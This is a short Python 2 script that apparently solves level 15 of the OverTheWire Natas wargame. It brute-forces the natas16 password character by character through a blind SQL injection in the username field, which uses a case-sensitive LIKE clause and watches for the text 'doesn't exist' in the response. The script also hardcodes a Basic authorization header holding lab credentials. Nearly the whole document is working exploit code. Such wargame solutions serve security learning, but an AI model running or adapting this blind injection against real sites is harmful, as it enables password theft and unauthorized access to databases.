
import requests

"""
IMPORTANT Use python 2, otherwise .find doesn't work
"""

all_char = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

found = False

# Collate latin1_general_cs is used to make LIKE case sensitive
# SQL injection
query = 'natas16" and password COLLATE latin1_general_cs like "'

# find your right authorization header in the request.
header = {
    "Authorization": "Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=="
}


pswd = []


while found is False:
    new_char = False
    for char in all_char:
        # Try all charcters (int, uppercase and lowercase)
        tmp = "".join(pswd) + char
        # Make a request with the password injected in the username.
        res = requests.post(url="http://natas15.natas.labs.overthewire.org/index.php?debug", data={
            "username": query + tmp + "%"
        }, headers=header)
        occurrence = res.content.find("doesn't exist")
        if occurrence == -1:
            # if the substring password matches, then we append the found new char to the result
            new_char = True
            pswd.append(char)
            print("".join(pswd))
            break
    # If it has been found a character, then continue. Otherwise it means that the password has finished.
    if new_char is True:
        found = False
    else:
        found = True

print ("The password is \n{}".format("".join(pswd)))
    


    

